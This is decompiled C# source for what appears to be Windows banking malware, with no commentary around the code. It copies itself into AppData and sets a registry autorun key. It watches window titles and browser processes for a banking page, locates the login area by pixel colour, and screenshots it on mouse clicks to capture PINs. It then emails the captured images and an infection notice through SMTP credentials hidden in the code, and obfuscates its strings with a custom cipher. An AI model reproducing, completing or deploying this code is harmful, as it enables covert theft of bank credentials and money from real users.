using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class Module1
{
	public struct MDNME
	{
		public IntPtr FRME;

		public string WRDS;
	}

	public static int PNNMBR = 0;

	public static bool STPSCN = false;

	public static string[] RSWNTIT = new string[6]
	{
		PCDEC2("uNba2NipwtzYBA==", "False"),
		PCDEC2("irC0taaUtGt/JQ==", "False"),
		PCDEC2("h6Odsagx", "False"),
		PCDEC2("rbfTzbyqyoHeDw==", "False"),
		PCDEC2("oMnHysiuyoLfDg==", "False"),
		PCDEC2("krGusrKKo7lspI6sKQ==", "False")
	};

	public static bool WINFND = false;

	public static bool FNDBNK = false;

	public static Point STRTLOC = default(Point);

	public static string CLRCO1;

	public static string CLRCO2;

	public static Thread TITH = new Thread(FND);

	public static Thread WITHR = new Thread(SERWIN);

	public static Thread WITHR2 = new Thread(SERWIN2);

	public static Thread BATH = new Thread(SCNBNK);

	public static Thread SNDTH = new Thread(SNDCNFRM);

	public static string Em = PCDEC2("lcO/y7SYsZbEvJG0wouyn7gY", "False");

	public static string Ps = PCDEC2("lrLOyL9lf4uRGA==", "False");

	public static bool SE = false;

	public static string sm = PCDEC2("pbrMz3+ZurnIvWCwx8wY", "False");

	public static Rectangle BNDS = Screen.get_PrimaryScreen().get_Bounds();

	public static Rectangle SCBNDS
	{
		get
		{
			return BNDS;
		}
		set
		{
			BNDS = value;
		}
	}

	[STAThread]
	public static void Main()
	{
		try
		{
			Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + PCDEC2("gJOvvrOAIw==", "False"));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + PCDEC2("gJOvvrOAIw==", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + PCDEC2("gJOvvrOAIw==", "False"));
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + PCDEC2("eYWsra6Mq7KwsHmMqLesS527ry0=", "False"), overwrite: true);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			string name = PCDEC2("hMXK0rWebJm/s5zBx36dkrq4xbWjFg==", "False");
			string value = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + PCDEC2("eYWsra6Mq7KwsHmMqLesS527ry0=", "False");
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(PCDEC2("a6Kkua55paOhhIGWsLSqh5myoY6BoaK0rouPgbqpipisuY19pbGupoaPkLqlLg==", "False"), writable: true);
			registryKey.SetValue(name, value);
			registryKey.Close();
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			SNDTH.IsBackground = true;
			SNDTH.Start();
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			WITHR.IsBackground = true;
			WITHR.Start();
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process.GetCurrentProcess().WaitForExit();
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
	}

	public static MDNME GETWNTXT()
	{
		StringBuilder stringBuilder = new StringBuilder(255);
		int num = (stringBuilder.Length = GetWindowText(GetForegroundWindow(), stringBuilder, checked(stringBuilder.Capacity + 1)));
		MDNME result = default(MDNME);
		result.WRDS = stringBuilder.ToString();
		result.FRME = GetForegroundWindow();
		return result;
	}

	public static void SNDCNFRM()
	{
		int num = default(int);
		try
		{
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + PCDEC2("marY2A0=", "False")))
			{
				try
				{
					SNDTH.Abort();
					return;
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex, num);
					ProjectData.ClearProjectError();
					return;
				}
			}
			int num2 = 0;
			while (true)
			{
				num = 1;
				try
				{
					MailMessage mailMessage = new MailMessage();
					MailMessage mailMessage2 = mailMessage;
					mailMessage2.From = new MailAddress(Em);
					mailMessage2.To.Add(Em);
					mailMessage2.Subject = PCDEC2("i8PS1dKrv9jffo/D09jNpsHK3n6Sz8jPw7LNy+HKq9OFvr+terTamF8I", "False") + ((ServerComputer)MyProject.Computer).get_Name() + PCDEC2("WrbUoXkM", "False") + DateTime.Now;
					mailMessage2.Body = PCDEC2("eKm6bLWIprFssISdqrW0hFqmbK6IqLG7pT+gt7urP66ttbE/nbS5rpSuqr5elqO5tKeNWnpsq4iousCjklq0sl6Toqq5XpOztbWshlq5tKOIrGW8p41oKQ==", "False");
					mailMessage2 = null;
					SmtpClient smtpClient = new SmtpClient(sm);
					SmtpClient smtpClient2 = smtpClient;
					smtpClient2.Port = 587;
					smtpClient2.EnableSsl = true;
					smtpClient2.Credentials = new NetworkCredential(Em, Ps);
					smtpClient2.Send(mailMessage);
					smtpClient2 = null;
					try
					{
						File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + PCDEC2("marY2A0=", "False"));
						break;
					}
					catch (Exception ex2)
					{
						ProjectData.SetProjectError(ex2, num);
						ProjectData.ClearProjectError();
						break;
					}
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3, num);
					if (num2 == 3)
					{
						try
						{
							SNDTH.Abort();
							ProjectData.ClearProjectError();
							break;
						}
						catch (Exception ex4)
						{
							ProjectData.SetProjectError(ex4, num);
							ProjectData.ClearProjectError();
						}
						ProjectData.ClearProjectError();
						break;
					}
					num2 = checked(num2 + 1);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5, num);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	public static extern int GetWindowText(IntPtr HWD, StringBuilder LPWITE, int NMACO);

	public static void SERWIN()
	{
		while (true)
		{
			try
			{
				string[] rSWNTIT = RSWNTIT;
				foreach (string value in rSWNTIT)
				{
					if (!GETWNTXT().WRDS.ToLower().Contains(value))
					{
						continue;
					}
					Process[] processes = Process.GetProcesses();
					foreach (Process process in processes)
					{
						if ((Operators.CompareString(process.ProcessName.ToLower(), PCDEC2("qrzczgo=", "False"), false) == 0) | (Operators.CompareString(process.ProcessName.ToLower(), PCDEC2("hZeorbKHl7a2nYObsy4=", "False"), false) == 0))
						{
							WINFND = true;
							Console.WriteLine("Window Found");
							Console.WriteLine("Scanning for bank");
							WITHR2.IsBackground = true;
							WITHR2.Start();
							BATH.IsBackground = true;
							BATH.Start();
							return;
						}
					}
				}
				Thread.Sleep(100);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void SERWIN2()
	{
		while (!STPSCN)
		{
			try
			{
				string[] rSWNTIT = RSWNTIT;
				foreach (string value in rSWNTIT)
				{
					if (GETWNTXT().WRDS.ToLower().Contains(value))
					{
						Process[] processes = Process.GetProcesses();
						foreach (Process process in processes)
						{
							if ((Operators.CompareString(process.ProcessName.ToLower(), PCDEC2("qrzczgo=", "False"), false) == 0) | (Operators.CompareString(process.ProcessName.ToLower(), PCDEC2("hZeorbKHl7a2nYObsy4=", "False"), false) == 0))
							{
								WINFND = true;
							}
						}
					}
					else
					{
						WINFND = false;
					}
				}
				Thread.Sleep(100);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void SendEmail()
	{
		//IL_0112: Unknown result type (might be due to invalid IL or missing references)
		DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + PCDEC2("gJOvvrOAIw==", "False"));
		FileInfo[] files = directoryInfo.GetFiles();
		Thread.Sleep(5000);
		Console.WriteLine("Sending");
		int num = 0;
		while (true)
		{
			int num2 = 2;
			try
			{
				MailMessage mailMessage = new MailMessage();
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.From = new MailAddress(Em);
				mailMessage2.To.Add(Em);
				mailMessage2.Subject = PCDEC2("Z5urZImLoamppDd4r7OjUVIx", "False") + ((ServerComputer)MyProject.Computer).get_Name() + PCDEC2("WrbUoXkM", "False") + DateTime.Now;
				mailMessage2.Body = PCDEC2("f7i1d7mctLO8vJ1lv71pj7G5xLKYpsTAuJhlxMZpnKrEya6Tu7V3vZKqcMeymGW2ybiXZcS/rkq1ubq9n7e1yncc", "False");
				try
				{
					FileInfo[] array = files;
					foreach (FileInfo fileInfo in array)
					{
						Attachment item = new Attachment(fileInfo.FullName);
						mailMessage2.Attachments.Add(item);
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex, num2);
					Exception ex2 = ex;
					MessageBox.Show(ex2.Message);
					ProjectData.ClearProjectError();
				}
				mailMessage2 = null;
				SmtpClient smtpClient = new SmtpClient(sm);
				SmtpClient smtpClient2 = smtpClient;
				smtpClient2.Port = 587;
				smtpClient2.EnableSsl = true;
				smtpClient2.Credentials = new NetworkCredential(Em, Ps);
				smtpClient2.Send(mailMessage);
				smtpClient2 = null;
				Console.WriteLine("Email Sent");
				AFTMTH();
				break;
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3, num2);
				if (num == 3)
				{
					Application.Restart();
					ProjectData.ClearProjectError();
					break;
				}
				num = checked(num + 1);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void AFTMTH()
	{
		try
		{
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + PCDEC2("eYWsra6Mq7KwsHmMqLesS527ry0=", "False"));
			ProjectData.EndApp();
			Application.Exit();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void FND()
	{
	}

	public static void SCNBNK()
	{
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_0269: Unknown result type (might be due to invalid IL or missing references)
		//IL_0270: Expected O, but got Unknown
		int num = 1;
		checked
		{
			Rectangle sCBNDS;
			while (!FNDBNK)
			{
				try
				{
					Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
					int width = ((Computer)MyProject.Computer).get_Screen().get_Bounds().Width;
					sCBNDS = ((Computer)MyProject.Computer).get_Screen().get_Bounds();
					Bitmap val = new Bitmap(width, sCBNDS.Height);
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					Point point = new Point(0, 0);
					Point point2 = new Point(0, 0);
					val2.CopyFromScreen(point, point2, size);
					int num2 = ((Image)val).get_Width() - 1;
					int num3 = 100;
					while (true)
					{
						if (num3 <= num2)
						{
							int num4 = ((Image)val).get_Height() - 1;
							int num5 = 100;
							while (true)
							{
								if (num5 <= num4)
								{
									if (!((val.GetPixel(num3, num5) == Color.FromArgb(170, 130, 126)) | (val.GetPixel(num3, num5) == Color.FromArgb(169, 129, 126)) | (val.GetPixel(num3, num5) == Color.FromArgb(168, 128, 125)) | (val.GetPixel(num3, num5) == Color.FromArgb(171, 131, 127))))
									{
										num5 += 2;
										continue;
									}
									CLRCO1 = num3.ToString();
									CLRCO2 = num5.ToString();
									Console.WriteLine("Bank Found");
									goto end_IL_018f;
								}
								num3 += 20;
								break;
							}
							continue;
						}
						Thread.Sleep(15);
						break;
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex, num);
					ProjectData.ClearProjectError();
				}
				continue;
				end_IL_018f:
				break;
			}
			STPSCN = true;
			STRTLOC = new Point((int)Math.Round(Conversions.ToDouble(CLRCO1) - 50.0), (int)Math.Round(Conversions.ToDouble(CLRCO2) - 90.0));
			Console.WriteLine(CLRCO1 + "x" + CLRCO2);
			Point sTRTLOC = STRTLOC;
			Size size2 = new Size(545, 335);
			sCBNDS = new Rectangle(sTRTLOC, size2);
			SCBNDS = sCBNDS;
			while (true)
			{
				try
				{
					if (PNNMBR > 5)
					{
						SendEmail();
						Console.WriteLine("Images Saved");
						break;
					}
					if (GetAsyncKeyState(1) != 0)
					{
						Console.WriteLine("Left Click");
						try
						{
							Bitmap val3 = new Bitmap(BNDS.Width, BNDS.Height, (PixelFormat)2498570);
							Graphics val4 = Graphics.FromImage((Image)(object)val3);
							val4.CopyFromScreen(SCBNDS.X, SCBNDS.Y, 0, 0, SCBNDS.Size, (CopyPixelOperation)13369376);
							PNNMBR++;
							((Image)val3).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + PCDEC2("gJOvvrOAIw==", "False") + PNNMBR + PCDEC2("VLG6uiQ=", "False"));
						}
						catch (Exception ex2)
						{
							ProjectData.SetProjectError(ex2, num);
							ProjectData.ClearProjectError();
						}
						Console.WriteLine("Pin #" + PNNMBR + " Saved");
					}
					Thread.Sleep(100);
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3, num);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	[DllImport("user32.dll")]
	public static extern short GetAsyncKeyState(int vKey);

	[DllImport("user32.dll")]
	public static extern short GetAsyncKeyState(Keys vKey);

	public static string PCDEC2(string Input, string LTTRHIT)
	{
		string @string = default(string);
		try
		{
			@string = Encoding.UTF8.GetString(DD2(Convert.FromBase64String(Input), Encoding.UTF8.GetBytes(LTTRHIT)));
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	public static byte[] DD2(byte[] Input, byte[] LTTRHIT)
	{
		checked
		{
			int num = Input[Input.Length - 1];
			byte[] array = new byte[Input.Length - 2 + 1];
			short num2 = 0;
			try
			{
				int num3 = Input.Length - 2;
				for (int i = 0; i <= num3; i++)
				{
					if (num2 >= LTTRHIT.Length)
					{
						num2 = 0;
					}
					if (i < Input.Length - 1)
					{
						array[i] = Convert.ToByte(unchecked((int)Input[i]) - unchecked(array.Length % LTTRHIT.Length) - unchecked((int)LTTRHIT[num2]) + num);
						num2 = (short)(num2 + 1);
					}
				}
				return array;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				byte[] result = array;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
